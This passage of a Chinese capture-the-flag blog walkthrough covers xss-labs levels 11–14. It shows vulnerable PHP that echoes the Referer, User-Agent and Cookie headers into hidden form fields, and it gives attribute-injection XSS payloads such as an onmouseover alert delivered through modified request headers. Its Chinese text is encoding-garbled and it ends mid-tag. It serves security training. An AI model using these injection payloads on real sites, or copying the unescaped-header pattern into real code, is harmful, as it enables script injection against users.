number">76</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">61</span><span class="token operator">%</span>6c<span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">72</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>2f<span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span><span class="token number">73</span><span class="token operator">%</span><span class="token number">73</span><span class="token operator">%</span>2f<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">79</span><span class="token operator">%</span><span class="token number">70</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span>3d<span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span><span class="token number">32</span><span class="token operator">%</span><span class="token number">32</span><span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">62</span><span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span><span class="token number">74</span><span class="token operator">%</span>6f<span class="token operator">%</span>6e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2011.11.35.png" style="zoom:50%;"><p>å¹¶ä¸èƒ½é—­åˆåŒå¼•å·ã€‚</p><h2 id="11-3-ä»£ç å®¡è®¡"><a href="#11-3-ä»£ç å®¡è®¡" class="headerlink" title="11.3 ä»£ç å®¡è®¡"></a>11.3 ä»£ç å®¡è®¡</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str00</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form id=search&gt;&lt;input name="t_link"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_history"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_sort"  value="'</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str00</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_ref"  value="'</span><span class="token operator">.</span><span class="token variable">$str33</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>level11.png</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3 align=center&gt;payloadçš„é•¿åº¦:"</span><span class="token operator">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h3&gt;"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€šè¿‡åˆ†æä»£ç å‘ç°ç›®æ ‡æœåŠ¡æ¥æ”¶ä¸€ä¸ª<code>$_SERVER['HTTP_REFERER']</code>çš„å‚æ•°ï¼Œå¹¶å›æ˜¾åœ¨<code>t_ref</code>çš„inputæ¡†ä¸­ã€‚</p><p>t_sortå‚æ•°é€šè¿‡htmlspecialcharsè¿›è¡Œäº†è½¬è¯‘ã€‚</p><h2 id="11-4-æŠ“åŒ…ä¿®æ”¹å‚æ•°"><a href="#11-4-æŠ“åŒ…ä¿®æ”¹å‚æ•°" class="headerlink" title="11.4 æŠ“åŒ…ä¿®æ”¹å‚æ•°"></a>11.4 æŠ“åŒ…ä¿®æ”¹å‚æ•°</h2><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2011.19.02.png" style="zoom:50%;"><p>æ·»åŠ refererå­—æ®µï¼š</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2011.21.15.png" style="zoom:50%;"><p>æ·»åŠ refererå­—æ®µä¹‹åå‘é€åˆ°æœåŠ¡ç«¯ï¼Œä¸€é¢—çœ‹åˆ°å›æ˜¾åœ¨äº†<code>t_ref</code>çš„inputæ¡†ä¸­çš„valueå­—æ®µä¸­ã€‚</p><p>å¹¶ä¸”ä»…ä»…è¿‡æ»¤äº†å·¦å³å°–æ‹¬å·ã€‚</p><ul><li>æ„é€ payload</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token number">123</span><span class="token string">" onmouseover='alert(/xss/)' type="</span>button<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2011.24.08.png" style="zoom:50%;"><p>ç„¶åç‚¹å‡»æäº¤æ•°æ®ã€‚</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2011.24.38.png" style="zoom:50%;"><p>é¼ æ ‡ç§»åŠ¨åˆ°æŒ‰é’®ä¸Šï¼Œå®ç°å¼¹çª—ã€‚</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2011.24.57.png" style="zoom:50%;"><h2 id="å°ç»“-10"><a href="#å°ç»“-10" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿™ä¸€å…³xssçš„å‚æ•°åœ¨httpè¯·æ±‚å¤´çš„refererå­—æ®µä¸­ã€‚</p><p>åœ¨å®é™…çš„åˆ©ç”¨è¿‡ç¨‹ä¸­ï¼Œè¿™ç§æƒ…å½¢å¯èƒ½æ¯”è¾ƒéš¾åˆ©ç”¨ï¼Œæ”»å‡»è€…éœ€è¦ä½œä¸ºä¸­é—´äººç¯¡æ”¹ç”¨æˆ·çš„è¯·æ±‚å¤´ã€‚</p><h1 id="åäºŒã€level-12ï¼ˆå›æ˜¾å‚æ•°ä¸ºUser-Agentå­—æ®µï¼‰"><a href="#åäºŒã€level-12ï¼ˆå›æ˜¾å‚æ•°ä¸ºUser-Agentå­—æ®µï¼‰" class="headerlink" title="åäºŒã€level-12ï¼ˆå›æ˜¾å‚æ•°ä¸ºUser Agentå­—æ®µï¼‰"></a>åäºŒã€level-12ï¼ˆå›æ˜¾å‚æ•°ä¸ºUser Agentå­—æ®µï¼‰</h1><h2 id="12-1-é¢˜é¢"><a href="#12-1-é¢˜é¢" class="headerlink" title="12.1 é¢˜é¢"></a>12.1 é¢˜é¢</h2><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2011.28.17.png" style="zoom:50%;"><h2 id="12-2-è§£é¢˜"><a href="#12-2-è§£é¢˜" class="headerlink" title="12.2 è§£é¢˜"></a>12.2 è§£é¢˜</h2><ul><li>æ¢æµ‹å›æ˜¾å‚æ•°ï¼š</li></ul><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2011.29.08.png" style="zoom:50%;"><p>åˆ†æXSSç›®æ ‡å‚æ•°åœ¨User-Agentå­—æ®µã€‚</p><ul><li>POCæµ‹è¯•</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script SCRscriptIPT " ' Oonn<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2011.31.28.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°ä»…ä»…è¿‡æ»¤äº†å·¦å³å°–æ‹¬å·ã€‚</p><ul><li>æ„å»ºpayload</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token number">123</span><span class="token string">" onmouseover='alert(/xss/)' type="</span>button<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2011.32.58.png" style="zoom:50%;"><p>æäº¤æ•°æ®ã€‚</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2011.33.27.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2011.33.48.png" style="zoom:50%;"><p>é€šè¿‡âœ…ã€‚</p><h2 id="12-3-ä»£ç å®¡è®¡"><a href="#12-3-ä»£ç å®¡è®¡" class="headerlink" title="12.3 ä»£ç å®¡è®¡"></a>12.3 ä»£ç å®¡è®¡</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str00</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form id=search&gt;&lt;input name="t_link"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_history"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_sort"  value="'</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str00</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_ua"  value="'</span><span class="token operator">.</span><span class="token variable">$str33</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$_SERVER['HTTP_USER_AGENT']</code>æ˜¯æµ‹è¯•ç›®æ ‡ã€‚</p><h2 id="å°ç»“-11"><a href="#å°ç»“-11" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>é’ˆå¯¹User-Agentå­—æ®µè¿›è¡Œxssã€‚</p><h1 id="åä¸‰ã€level-13ï¼ˆå›æ˜¾å‚æ•°ä¸ºCookieå­—æ®µï¼‰"><a href="#åä¸‰ã€level-13ï¼ˆå›æ˜¾å‚æ•°ä¸ºCookieå­—æ®µï¼‰" class="headerlink" title="åä¸‰ã€level-13ï¼ˆå›æ˜¾å‚æ•°ä¸ºCookieå­—æ®µï¼‰"></a>åä¸‰ã€level-13ï¼ˆå›æ˜¾å‚æ•°ä¸ºCookieå­—æ®µï¼‰</h1><h2 id="13-1-é¢˜é¢"><a href="#13-1-é¢˜é¢" class="headerlink" title="13.1 é¢˜é¢"></a>13.1 é¢˜é¢</h2><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2011.38.33.png" style="zoom:50%;"><h2 id="13-2-è§£é¢˜"><a href="#13-2-è§£é¢˜" class="headerlink" title="13.2 è§£é¢˜"></a>13.2 è§£é¢˜</h2><ul><li>æ¢æµ‹å›æ˜¾å‚æ•°</li></ul><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2011.39.51.png" style="zoom:50%;"><p>t_cookå‚æ•°æ¯”è¾ƒå¯ç–‘ï¼Œçœ‹ç€æŒºåƒcookieçš„ã€‚æŠ“ä¸ªåŒ…çœ‹çœ‹è¿™ä¸ªâ€call me maybeâ€å“ªæ¥çš„ï¼Ÿ</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2011.43.18.png" style="zoom:50%;"><p>ç¡®å®æ˜¯ä»cookieå¤„æ¥çš„ã€‚</p><ul><li>POCæµ‹è¯•</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script SCRscriptIPT " ' Oonn<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2013.16.57.png" style="zoom:50%;"><p>ä»…è¿‡æ»¤äº†å·¦å³å°–æ‹¬å·ã€‚</p><ul><li>æ„å»ºpayload</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token number">123</span><span class="token string">" onmouseover='alert(/xss/)' type="</span>button<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2013.18.56.png" style="zoom:50%;"><p>æäº¤æ•°æ®ã€‚</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2013.19.19.png" style="zoom:50%;"><p>è§¦å‘xssä»£ç æ‰§è¡Œã€‚</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2013.19.46.png" style="zoom:50%;"><h2 id="13-3-ä»£ç å®¡è®¡"><a href="#13-3-ä»£ç å®¡è®¡" class="headerlink" title="13.3 ä»£ç å®¡è®¡"></a>13.3 ä»£ç å®¡è®¡</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">?</span>php <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token string">"call me maybe?"</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$str <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>$str00 <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>$str11<span class="token operator">=</span>$_COOKIE<span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>$str22<span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&gt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span>$str11<span class="token punctuation">)</span><span class="token punctuation">;</span>$str33<span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span>$str22<span class="token punctuation">)</span><span class="token punctuation">;</span>echo <span class="token string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span>$str<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span><span class="token punctuation">.</span>'<span class="token operator">&lt;</span>center<span class="token operator">&gt;</span><span class="token operator">&lt;</span>form id<span class="token operator">=</span>search<span class="token operator">&gt;</span><span class="token operator">&lt;</span>input name<span class="token operator">=</span><span class="token string">"t_link"</span>  value<span class="token operator">=</span><span class="token string">"'.'"</span> type<span class="token operator">=</span><span class="token string">"hidden"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>input name<span class="token operator">=</span><span class="token string">"t_history"</span>  value<span class="token operator">=</span><span class="token string">"'.'"</span> type<span class="token operator">=</span><span class="token string">"hidden"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>input name<span class="token operator">=</span><span class="token string">"t_sort"</span>  value<span class="token operator">=</span><span class="token string">"'.htmlspecialchars($str00).'"</span> type<span class="token operator">=</span><span class="token string">"hidden"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>input name<span class="token operator">=</span><span class="token string">"t_cook"</span>  value<span class="token operator">=</span><span class="token string">"'.$str33.'"</span> type<span class="token operator">=</span><span class="token string">"hidden"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>center<span class="token operator">&gt;</span>'<span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>t_cookè·å–cookie</p><h2 id="å°ç»“-12"><a href="#å°ç»“-12" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>é’ˆå¯¹Cookieå­—æ®µè¿›è¡Œxssã€‚</p><h1 id="åå››ã€level-14-ï¼ˆå›¾ç‰‡exifä¿¡æ¯xssæ”»å‡»ï¼‰"><a href="#åå››ã€level-14-ï¼ˆå›¾ç‰‡exifä¿¡æ¯xssæ”»å‡»ï¼‰" class="headerlink" title="åå››ã€level-14***ï¼ˆå›¾ç‰‡exifä¿¡æ¯xssæ”»å‡»ï¼‰"></a>åå››ã€level-14***ï¼ˆå›¾ç‰‡exifä¿¡æ¯xssæ”»å‡»ï¼‰</h1><h2 id="14-1-é¢˜é¢"><a href="#14-1-é¢˜é¢" class="headerlink" title="14.1 é¢˜é¢"></a>14.1 é¢˜é¢</h2><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2013.26.01.png" style="zoom:50%;"><p>ï¼ˆè¿™ä¸ªé¡µé¢å…¶å®æ˜¯ä¸æ­£å¸¸çš„æ˜¾ç¤ºï¼Œåé¢ä¼šæåˆ°ã€‚ï¼‰</p><h2 id="14-2-å¼¯è·¯"><a href="#14-2-å¼¯è·¯" class="headerlink" title="14.2 å¼¯è·¯"></a>14.2 å¼¯è·¯</h2><p>åœ¨ä¸çŸ¥é“è¿™å…³å…¶å®æŒ‚æ‰ä¹‹åèµ°çš„ä¸€äº›å¼¯è·¯</p><h3 id="14-2-1-å°è¯•è§£é¢˜"><a href="#14-2-1-å°è¯•è§£é¢˜" class="headerlink" title="14.2.1 å°è¯•è§£é¢˜"></a>14.2.1 å°è¯•è§£é¢˜</h3><ul><li>æ¢æµ‹å›æ˜¾é€»è¾‘</li></ul><p>æ²¡æœ‰æ˜æ˜¾çš„å‚æ•°æäº¤å’Œå›æ˜¾ã€‚</p><p>æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼šå‘ç°æ’å…¥äº†ä¸€ä¸ªiframeï¼Œè®¿é—®çš„åœ°å€æ˜¯<code>http://www.exifviewer.org/</code>ï¼Œå¹¶å°†è¯¥ç½‘é¡µåµŒå…¥åœ¨å½“å‰ç½‘é¡µä¸­ã€‚</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html;charset=utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>æ¬¢è¿æ¥åˆ°level14<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>center</span><span class="token punctuation">&gt;</span></span>æ¬¢è¿æ¥åˆ°level14<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>leftframe<span class="token punctuation">"</span></span> <span class="token attr-name">marginwidth</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>10</span> <span class="token attr-name">marginheight</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>10</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.exifviewer.org/<span class="token punctuation">"</span></span> <span class="token attr-name">frameborder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>no</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>80%<span class="token punctuation">"</span></span> <span class="token attr-name">scrolling</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>no<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>80%</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span>è¿™å…³æˆåŠŸåä¸ä¼šè‡ªåŠ¨è·³è½¬ã€‚æˆåŠŸè€…&lt;a href=/xss/level15.php?src=1.gif&gt;ç‚¹æˆ‘è¿›level15<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>è®¿é—®<code>http://www.exifviewer.org/</code></li></ul><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2013.30.05.png" style="zoom:50%;"><p>ç½‘é¡µæºä»£ç ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">data-adblockkey</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBANDrp2lz7AOmADaN8tA50LsWcjLFyQFcb/P2Txc58oYOeILb3vBw7J6f4pamkAQVSQuqYsKx3YzdUHCvbVZvFUsCAwEAAQ==_J6X9s0IorRD+0hqMUWIoDabixD/nOIsKZHj78GOfvQQg8+RdLBALRSO/DHhuUb+Gy20sAvzDn9qKgr8xI5T7cA==<span class="token punctuation">"</span></span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">background</span><span class="token punctuation">:</span> #2B2B2B<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token 